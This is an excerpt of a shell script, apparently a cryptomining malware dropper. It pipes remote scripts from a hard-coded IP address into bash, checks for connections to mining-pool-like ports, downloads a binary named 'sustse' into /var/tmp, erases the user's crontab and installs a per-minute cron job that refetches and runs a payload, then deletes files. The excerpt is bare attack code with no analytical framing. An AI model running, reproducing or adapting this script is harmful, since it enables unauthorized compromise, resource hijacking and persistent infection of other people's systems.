...
curl http://192.99.142.246:8220/2mr.sh | bash -sh
fi
sleep 2
netstat -ant|grep '192.99.142.232:80\|192.99.142.249:3333\|202.144.193.110:3333'|grep 'ESTABLISHED'|grep -v grep
if [ $? -eq 0 ]
...
curl http://192.99.142.246:8220/3mr.sh | bash -sh
fi
DIR="/var/tmp"
if [ -a "/var/tmp/sustse" ]
then
...
download2() {
    ...
    then
        $WGET $DIR/sustse http://192.99.142.246:8220/tte2
    fi
...
if crontab -l | grep -q "192.99.142.246:8220"
then
    echo "Cron exists"
else
    crontab -r
	...
	(crontab -l 2>/dev/null; echo "* * * * * $LDR http://192.99.142.246:8220/mr.sh | bash -sh > /dev/null 2>&1")| crontab -
fi
rm -rf /var/tmp/jrm
rm -rf /tmp/jrm
